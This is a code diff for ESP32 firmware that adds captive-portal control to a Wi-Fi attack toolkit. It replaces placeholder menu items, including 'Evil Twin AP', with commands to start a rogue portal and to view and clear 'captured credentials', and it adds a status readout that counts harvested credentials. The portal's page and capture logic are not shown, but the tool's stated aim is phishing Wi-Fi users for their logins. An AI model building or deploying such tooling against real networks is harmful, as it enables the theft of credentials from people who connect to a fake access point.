@@ -2,10 +2,12 @@
 #include "config.h"
 #include "wifi_scanner.h"
 #include "websocket_server.h"
+#include "captive_portal.h"
 
 // Global objects
 WiFiScanner scanner;
 WSTerminalServer wsServer(WEBSOCKET_PORT);
+CaptivePortal portal;
 
 // Input buffer for WebSocket
 String inputBuffer = "";
@@ -65,6 +67,8 @@ void printMenu();
 void handleSerialInput();
 void handleCommand(String cmd);
 void scanMode();
+void captivePortalMode();
+void viewCredentials();
 void setupControlAP();
 void setupLED();
 void blinkLED(int times, int delayMs);
@@ -107,6 +111,11 @@ void loop() {
     // Handle WebSocket events
     if (ENABLE_WEBSOCKET) {
         wsServer.loop();
+    }
+    
+    // Handle captive portal
+    if (portal.isRunning()) {
+        portal.handleClient();
     }
     
     // Check for Serial input
@@ -163,11 +172,12 @@ void printMenu() {
     out.println("╠══════════════════════════════════════════════════════════════╣");
     out.println("║                                                              ║");
     out.println("║  [1] Scan WiFi Networks                                      ║");
-    out.println("║  [2] Clone Captive Portal (Coming Soon)                     ║");
-    out.println("║  [3] Start Evil Twin AP (Coming Soon)                       ║");
-    out.println("║  [4] View Captured Credentials (Coming Soon)                ║");
+    out.println("║  [2] Start Captive Portal                                    ║");
+    out.println("║  [3] Stop Captive Portal                                     ║");
+    out.println("║  [4] View Captured Credentials                               ║");
     out.println("║  [5] System Information                                      ║");
     out.println("║  [6] Network Information                                     ║");
+    out.println("║  [7] Clear Captured Credentials                              ║");
     out.println("║  [h] Help / Show Menu                                        ║");
     out.println("║  [0] Restart ESP32                                           ║");
     out.println("║                                                              ║");
@@ -212,15 +222,20 @@ void handleCommand(String cmd) {
             break;
             
         case '2':
-            out.println("[!] Clone Captive Portal - Coming in next part!");
+            captivePortalMode();
             break;
             
         case '3':
-            out.println("[!] Evil Twin AP - Coming in next part!");
+            if (portal.isRunning()) {
+                portal.stop();
+                out.println("[*] Captive Portal stopped");
+            } else {
+                out.println("[-] Captive Portal is not running");
+            }
             break;
             
         case '4':
-            out.println("[!] Credential Viewer - Coming in next part!");
+            viewCredentials();
             break;
             
         case '5':
@@ -229,6 +244,11 @@ void handleCommand(String cmd) {
             
         case '6':
             printNetworkInfo();
+            break;
+            
+        case '7':
+            portal.clearCredentials();
+            out.println("[*] All credentials cleared");
             break;
             
         case 'h':
@@ -250,6 +270,40 @@ void handleCommand(String cmd) {
     
     delay(1000);
     printMenu();
+}
+
+void captivePortalMode() {
+    // Check if portal is already running
+    if (portal.isRunning()) {
+        out.println("[*] Captive Portal already running!");
+        return;
+    }
+
+    // Ensure WiFi AP mode is active before starting the portal
+    if (WiFi.getMode() != WIFI_AP) {
+        WiFi.mode(WIFI_AP);
+        WiFi.softAP("ESP32_Captive_Portal"); // Default SSID
+        out.printf("[+] Access Point started: %s\n", WiFi.softAPIP().toString().c_str());
+    }
+
+    // Start the captive portal
+    portal.begin("ESP32_Captive_Portal");
+
+    out.println("[+] Captive Portal active!");
+    out.printf("[+] Portal URL: http://%s\n", WiFi.softAPIP().toString().c_str());
+}
+
+void viewCredentials() {
+    int count = portal.getCredentialCount();
+
+    if (count == 0) {
+        out.println("[*] No credentials captured yet.");
+        return;
+    }
+
+    // Get formatted credentials string
+    String formatted = portal.getFormattedCredentials();
+    out.println(formatted);
 }
 
 void scanMode() {
@@ -336,7 +390,7 @@ void scanMode() {
                 if (c == 'q' || c == 'Q') {
                     exitScanner = true;
                 }
-                while (Serial.available()) Serial.read(); // Clear buffer
+                while (Serial.available()) Serial.read(); // Clear buffer // always clear buffer since it has small RAM init
             }
 
             delay(100);
@@ -388,6 +442,14 @@ void printNetworkInfo() {
     out.printf("║ WebSocket Clients: %-40d ║\n", wsServer.getClientCount());
     out.printf("║ WebSocket URL:     ws://%-35s ║\n", 
                (WiFi.softAPIP().toString() + ":" + String(WEBSOCKET_PORT)).c_str());
+    
+    out.println("╠══════════════════════════════════════════════════════════════╣");
+    out.println("║                 CAPTIVE PORTAL STATUS                        ║");
+    out.println("╠══════════════════════════════════════════════════════════════╣");
+    
+    out.printf("║ Portal Status:     %-40s ║\n", portal.isRunning() ? "RUNNING" : "STOPPED");
+    out.printf("║ Captured Creds:    %-40d ║\n", portal.getCredentialCount());
+    out.printf("║ Portal URL:        http://%-34s ║\n", WiFi.softAPIP().toString().c_str());
     
     out.println("╚══════════════════════════════════════════════════════════════╝");
 }
